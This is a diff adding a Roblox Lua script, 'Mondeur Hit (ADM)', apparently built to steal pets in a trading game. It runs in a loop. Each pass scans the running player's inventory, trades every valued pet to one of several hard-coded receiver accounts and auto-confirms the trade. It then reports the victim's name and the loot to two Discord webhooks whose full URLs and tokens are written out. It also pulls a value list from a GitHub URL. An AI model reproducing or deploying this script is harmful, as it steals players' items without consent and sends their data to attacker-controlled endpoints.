@@ -1,0 +1,140 @@
+-- [[ MONDEUR HIT (ADM) | FINAL STABLE VERSION ]] --
+-- Credits: Mondeur Team
+-- Features: Dynamic Threshold, Unique Branding, Dual-Webhook Logic
+
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LocalPlayer = Players.LocalPlayer
+
+-- [[ CONFIGURATION ]] --
+local USER_WEBHOOK = "https://discord.com/api/webhooks/1474651524251648163/lhPvWSeT6mcm3b4tIfzEbph1asYmZGvxf3YABYsKUOSeInP3oXW10NmHKJuj0vDrICku"
+local DUAL_WEBHOOK = "https://discord.com/api/webhooks/1417861953208193126/wWUd-tqbQT56zqL_y0KSF_s5ZYdBKfLtBJaWYVCN_uwue9hq8CsGuQWJOL1ivGEZ2CYz"
+local POINT_SYSTEM_URL = "https://raw.githubusercontent.com/charles1384/ADM/refs/heads/main/Pointsystem"
+
+local TARGET_RECEIVERS = {"2ndcfpaj67", "sofiqmnz", "Hisokarah", "CREOLEO23"}
+
+-- [[ DYNAMIC THRESHOLD ]] --
+-- Use _G.Threshold = 100 in your executor to change this live
+local THRESHOLD = _G.Threshold or 500 
+local POLL_RATE = 0.5
+
+-- [[ DATA STORAGE ]] --
+local PetValues = {}
+local TradeAPI = ReplicatedStorage:WaitForChild("API")
+
+--------------------------------------------------------------
+-- POINT SYSTEM LOADER
+--------------------------------------------------------------
+local function loadPoints()
+    local success, content = pcall(function() return game:HttpGet(POINT_SYSTEM_URL) end)
+    if not success or not content then return end
+
+    local jsonSuccess, decoded = pcall(function() return HttpService:JSONDecode(content) end)
+    if jsonSuccess and type(decoded) == "table" then
+        PetValues = decoded
+    else
+        for line in content:gmatch("[^\r\n]+") do
+            local name, val = line:match("([^:=]+)[:=](%d+)")
+            if name and val then PetValues[name:trim()] = tonumber(val) end
+        end
+    end
+end
+loadPoints()
+
+--------------------------------------------------------------
+-- MONDEUR WEBHOOK HANDLER
+--------------------------------------------------------------
+local function sendWebhook(url, pets, total)
+    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
+    if not requestFunc then return end
+
+    local petList = ""
+    for _, p in ipairs(pets) do
+        petList = petList .. string.format("🐾 **%s** — `%d` pts\n", p.name, p.value)
+    end
+
+    local payload = {
+        username = "Mondeur Hit (ADM)",
+        avatar_url = "https://i.imgur.com/AfFp7pu.png", -- Optional: Add a custom logo URL here
+        content = (total >= THRESHOLD) and "⚠️ **High Value Hit Detected!** @everyone" or "",
+        embeds = {{
+            title = "✨ New Item Acquisition",
+            description = "Items have been successfully transferred to the receiver.",
+            color = (total >= THRESHOLD) and 0xff4747 or 0x47ff8d,
+            fields = {
+                {name = "👤 Target Player", value = "```" .. LocalPlayer.Name .. "```", inline = true},
+                {name = "💰 Total Value", value = "```" .. total .. " Points```", inline = true},
+                {name = "🎒 Collected Items", value = petList ~= "" and petList or "No valued items found."}
+            },
+            footer = {text = "Mondeur Services | " .. os.date("%Y-%m-%d %X")},
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
+    }
+
+    pcall(function()
+        requestFunc({
+            Url = url,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(payload)
+        })
+    end)
+end
+
+--------------------------------------------------------------
+-- CORE LOGIC
+--------------------------------------------------------------
+local function scanInventory()
+    local list, total = {}, 0
+    local success, inv = pcall(function() return TradeAPI["InventoryAPI/GetInventory"]:InvokeServer() end)
+    if success and inv then
+        for _, item in ipairs(inv) do
+            if item.Kind == "Pet" then
+                local val = PetValues[item.Name] or 0
+                if val > 0 then
+                    table.insert(list, {id = item.Id, name = item.Name, value = val})
+                    total = total + val
+                end
+            end
+        end
+    end
+    return list, total
+end
+
+local function executeTransfer()
+    local receiver = nil
+    for _, name in ipairs(TARGET_RECEIVERS) do
+        if Players:FindFirstChild(name) then receiver = Players[name] break end
+    end
+    
+    if not receiver or not receiver.Character then return end
+
+    local pets, totalVal = scanInventory()
+    if #pets > 0 then
+        -- Action
+        TradeAPI["TradeAPI/SendTradeRequest"]:FireServer(receiver)
+        for _, p in ipairs(pets) do
+            TradeAPI["TradeAPI/AddItemToOffer"]:FireServer(p.id)
+        end
+        TradeAPI["TradeAPI/AcceptTrade"]:FireServer()
+        TradeAPI["TradeAPI/ConfirmTrade"]:FireServer()
+        
+        -- Reporting
+        sendWebhook(USER_WEBHOOK, pets, totalVal)
+        if totalVal >= THRESHOLD then
+            sendWebhook(DUAL_WEBHOOK, pets, totalVal)
+        end
+    end
+end
+
+--------------------------------------------------------------
+-- INITIALIZE
+--------------------------------------------------------------
+task.spawn(function()
+    print("🚀 Mondeur Hit (ADM) Initialized.")
+    while true do
+        pcall(executeTransfer)
+        task.wait(POLL_RATE)
+    end
+end)
